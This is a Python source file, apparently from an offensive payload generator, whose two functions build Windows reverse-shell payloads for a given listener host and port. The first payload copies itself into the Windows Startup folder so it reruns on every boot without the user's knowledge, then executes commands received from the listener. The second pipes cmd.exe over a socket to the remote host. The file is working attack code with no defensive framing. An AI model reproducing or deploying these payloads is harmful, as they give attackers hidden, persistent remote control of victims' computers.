def windows_reverse_shell_hidden_terminal(host, port):
    """
    :param host: listener address
    :param port: listener port
    :return: python reverse shell payload for windows as a string
    """
    return f'''import socket
import subprocess
import threading
import os

HOST = "{host}"
PORT = {port}

def add_to_startup_for_autorun():
    """
    this system call will add the current file to the startup folder of the windows to make it run on startup
    with this function, the payload will be executed every time the system is booted/restarted without the user's knowledge.
    only way to stop this is to delete the file from the startup folder

    os.path.basename(__file__) returns the name of the current file which this function is called from
    :return:
    """

    os.system(f"copy {{os.path.basename(__file__).replace('.py', '.exe')}} \\"%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\"")


def TCP_CONNECTION(HOST, PORT):
    """
    this function will create a socket and connect to the listener
    :param HOST: Host IP
    :param PORT: Host Listener Port
    :return:
    """
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
        return client_socket
    except Exception as e:
        print(e)


def execute_command(client, data):
    try:
        process = subprocess.Popen(data.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        output = process.stdout.read() + process.stderr.read()
        client.send(output + b"\\n") 
    except Exception as e:
        print("Error executing command:", e)
        client.send(str(e).encode() + b"\\n")

def receive_command_from_listener(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "terminate":
                client.close()
                break
            else:
                threading.Thread(target=execute_command, args=(client, data)).start()
    except Exception as e:
        print("Error receiving command:", e)
        client.close()


def main():
    add_to_startup_for_autorun()
    client = TCP_CONNECTION(HOST, PORT)
    if client:
        receive_command_from_listener(client)


if __name__ == "__main__":
    main()
'''


def windows_reverse_shell_active_terminal(host, port):
    """
    :param host: listener address
    :param port: listener port
    :return: python reverse shell payload for windows as a string
    """
    return f"""import os, socket, subprocess, threading

HOST = '{str(host)}'
PORT = {port}

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
        """